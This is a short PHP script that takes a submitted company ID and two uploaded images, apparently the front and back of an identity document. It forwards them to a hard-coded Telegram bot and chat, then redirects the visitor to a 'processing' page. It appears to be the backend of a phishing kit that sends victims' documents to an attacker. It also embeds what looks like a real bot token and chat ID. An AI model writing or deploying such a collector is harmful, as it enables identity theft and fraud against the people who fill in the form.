<?php
// Report all errors to help debug any issues that might occur
error_reporting(E_ALL);
ini_set('display_errors', 1);

// --- 1. Configuration ---
// Your Telegram bot token and chat ID (Ensure these are exactly right)
$botToken = "8023709482:AAE1lBDGOmPbJ5B6_cpBTQfPiRJ2uG7_qM"; // REPLACE with YOUR actual token
$chatId   = "8483934112"; // REPLACE with YOUR actual chat ID

// --- 2. Input Data ---
$companyId = $_POST['companyId'] ?? '';
$frontFile = $_FILES['frontUpload'] ?? null;
$backFile  = $_FILES['backUpload'] ?? null;

// --- 3. Telegram API Functions ---

/**
 * Sends a text message to Telegram.
 */
function sendMessage($botToken, $chatId, $text) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);
    // Use cURL for stability and error checking
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        // Log or print the error if the request fails
        error_log("Telegram sendMessage cURL Error: " . $error);
    }
    return $result;
}

/**
 * Sends a document (file) to Telegram using multipart/form-data.
 */
function sendDocument($botToken, $chatId, $file) {
    // Check if a file was actually uploaded without errors
    if ($file && $file['error'] === 0) {
        $url = "https://api.telegram.org/bot$botToken/sendDocument";
        
        // Prepare file for cURL (must use CURLFile)
        $post_fields = [
            'chat_id' => $chatId,
            // The @ prefix is needed for older PHP versions; CURLFile is for PHP 5.5+
            'document' => new CURLFile($file['tmp_name'], $file['type'], $file['name'])
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        
        $result = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            // Log or print the error if the file upload fails
            error_log("Telegram sendDocument cURL Error: " . $error);
        }
        return $result;
    }
    return false;
}

// --- 4. Execution ---

// A. Send company ID message first
if (!empty($companyId)) {
    sendMessage(
        $botToken, 
        $chatId, 
        "📌 New Submission\nCompany ID: $companyId"
    );
}

// B. Send front image
sendDocument($botToken, $chatId, $frontFile);

// C. Send back image
sendDocument($botToken, $chatId, $backFile);

// D. Send a final confirmation message (optional, but good for testing)
sendMessage($botToken, $chatId, "✅ All files and data received successfully.");

// --- 5. Redirect User & Exit (This must be the last step!) ---
header("Location: processing.html");
exit;
